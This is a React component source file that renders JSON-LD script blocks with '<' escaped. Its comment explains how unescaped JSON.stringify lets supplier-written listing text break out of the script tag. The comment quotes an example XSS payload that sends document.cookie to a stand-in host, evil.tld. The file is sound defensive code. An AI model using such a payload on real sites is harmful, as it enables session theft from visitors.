/**
 * Renders a JSON-LD structured-data block.
 *
 * Always use this rather than writing the <script> by hand, because the
 * obvious way to write it is unsafe:
 *
 *     <script type="application/ld+json"
 *             dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }} />
 *
 * JSON.stringify does not escape "<" or "/". Inside a <script> element the
 * browser is not parsing JSON yet — it is scanning raw text for the closing
 * tag — so a value containing "</script>" ends the element early and anything
 * after it is parsed as markup and executed. A listing named
 *
 *     Cathedral Peak Lodge</script><script>fetch('//evil.tld?c='+document.cookie)</script>
 *
 * becomes a script tag on every visitor's page. That matters here because
 * these blocks carry supplier-supplied strings — listing names, descriptions,
 * addresses, amenities — from vd_entities, which suppliers may write for their
 * own rows ("Suppliers insert own" / "Owners update own"), and the pages are
 * public.
 *
 * Escaping every "<" to its unicode escape is sufficient and complete: "<" is
 * the only character that can begin a tag, the escape is valid JSON that
 * parses back to "<", and consumers (Google's Rich Results test included) read
 * the parsed value — so the structured data still validates unchanged.
 */
export default function JsonLd({ data }: { data: unknown }) {
  return (
    <script
      type="application/ld+json"
      dangerouslySetInnerHTML={{ __html: JSON.stringify(data).replace(/</g, '\\u003c') }}
    />
  )
}
